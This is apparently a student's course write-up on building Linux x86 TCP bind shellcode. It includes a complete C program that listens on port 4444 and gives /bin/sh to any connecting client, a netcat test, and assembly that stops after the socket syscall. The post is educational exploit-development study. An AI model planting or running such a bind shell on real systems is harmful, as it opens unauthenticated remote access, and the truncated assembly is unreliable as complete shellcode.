---
title:  "SLAE x86 Assignment 1: TCP Bind Shellcode"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

![Shellcoding](/assets/images/slae32.png)

### TCP BIND SHELLCODE

* Binds to a port
* Executes a shell on an incoming connection
* Port number should be easily configurable

#### CONCEPT 

A TCP bind shellcode will bind a shell to a specific network port on a host listening for an incoming connection via the TCP protocol.

![Bind Shell](/assets/images/bind_shell.png)

Bind shells are easily blocked by firewalls and inbound filtering rules along with NAT preventing unsolicited incoming connections (except for certain ports with known services). This limits the target host's exposure and will prevent a port-binding shellcode from receiving a successful connection.

#### TCP BIND SHELL IN C
--------

The following C skeleton code will be used to demonstrate the TCP bind shell from a high-level language perspective. 

This will be used as a template for the low-level assembly code to follow:

```c
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;  // socket for host  
int client_sockid;  // socket for client  
      
struct sockaddr_in hostaddr;  // sockaddr struct  
  
int main()  
{  
    // 1st syscall - create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Create sockaddr struct 
    hostaddr.sin_family = AF_INET;  // consists of AF_INET
    hostaddr.sin_port = htons(4444);  // bind socket using port 4444  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  // listen on any interface
  
    // 2nd syscall - bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // 3rd syscall - listen for incoming connections  
    listen(host_sockid, 2);  
  
    // 4th syscall - accept incoming connections using the created socket   
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // 6th syscall - executes /bin/sh using execve  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}
```

Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:

* socket
* bind
* listen
* accept
* dup2
* execve

The syscalls in the C code relate to the socket network access protocol as referenced below in the Linux master header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/linux/net.h 

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

A socket is defined in the man pages with domain, type and protocol arguments:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man socket

SOCKET(2)                              Linux Programmer's Manual                             SOCKET(2)

NAME
       socket - create an endpoint for communication

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);

DESCRIPTION
       socket() creates an endpoint for communication and returns a descriptor.

       The  domain  argument  specifies a communication domain; this selects the protocol family which
       will be used for communication.  These families are defined in <sys/socket.h>.   The  currently
       understood formats include:

       Name                Purpose                          Man page
       AF_UNIX, AF_LOCAL   Local communication              unix(7)
       AF_INET             IPv4 Internet protocols          ip(7)
```

The C code achieves the following objectives:

* Creates a socket
* Binds the socket to a port
* Configures the socket to listen for incoming connections
* Accepts connections on the created socket
* Redirects STDIN, STDOUT, and STDERR to the incoming client connection
* Executes a shell

#### POC 

The C code is compiled and executed demonstrating a successful bind connection and shell on the local host via port 4444:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc shell_bind_tcp.c -o shell_bind_tcp
osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp 

osboxes@osboxes:~$ netstat -ano | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      off (0.00/0/0)
osboxes@osboxes:~$ nc 127.0.0.1 4444
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

#### TCP Bind Shell in Assembly
--------------

Using the C code as a reference and template for the Assembly code, the memory registers are initialized and cleared by performing an XOR operation against themselves which sets their values to '0':

```nasm
	; initialize registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```

#### 1st Syscall (Create Socket)

To create the socket syscall, a value is needed in the EAX register to call socket:

```bash 
osboxes@osboxes:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socketcall		102
```

The header file reveals the code for socket is 102. Converting 102 from decimal to hex equates to the hex equivalent of 0x66, this value will be placed in the low space of EAX (avoid Null Bytes with padding).

The next values are that of the socket properties defined earlier with the man pages, the integer values for type (SOCK_STREAM) and domain (AF_INET/PF_INET) can be found in the socket header file:

```bash
osboxes@osboxes:~$ cat /usr/include/i386-linux-gnu/bits/socket.h
SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define	PF_INET		2	/* IP protocol family.  */
```

The last argument value for int protocol is going to be ‘0’ to accept any protocol according to the man pages definition for socket. The registers would show the following at this stage:

* EBX == 0x02
* ECX == 0x01
* EDX == 0x00

The EDX register was already cleared when initialised, the zero value is set and does not require any change.

The socket syscall is executed with int 0x80 which creates the socket in the program, passing control to the interrupt vector in order to handle the socket syscall:

```nasm
	int 0x80       ; create the socket, execute the syscall
```

The newly created socket can be identified by storing the value of EAX into the EDI register as a reference for a later stage with the ability to use EAX in subsequent system calls:

```nasm
	mov edi, eax   ; move the value of eax into edi for later reference
```

1st Syscall (Assembly code):

```nasm
	; 1st syscall - create socket
	mov al, 0x66    ; hex value for socket
	mov bl, 0x02    ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 0x01    ; setting SOCK_STREAM, value from /usr/include/i386-linux-gnu/bits/socket.h

	int 0x80        ; create the socket, execute the syscall 
	mov edi, eax    ; move the value of eax into edi for later reference
```

#### 2nd Syscall (Bind Socket to IP/Port in Sockaddr Struct)

To bind a port to the newly created socket the EAX register is cleared out using the XOR opertion. Next instruction set moves the hex value for the socket function into the lower half of EAX which is required for the bind syscall.

```nasm
	xor eax, eax
	mov al, 0x66
```

#### Assembly Code
-------------

````nasm
global_start

section .text
_start: 

	; initialize registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; 1st syscall - create socket
	mov al, 0x66    ; hex value for socket
	mov bl, 0x02    ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 0x01    ; setting SOCK_STREAM, value from /usr/include/i386-linux-gnu/bits/socket.h

	int 0x80        ; create the socket, execute the syscall 
	mov edi, eax    ; move the value of eax into edi for later reference
````

##### SLAE DISCLAIMER ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: SLAE-xxxx

Github Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment1
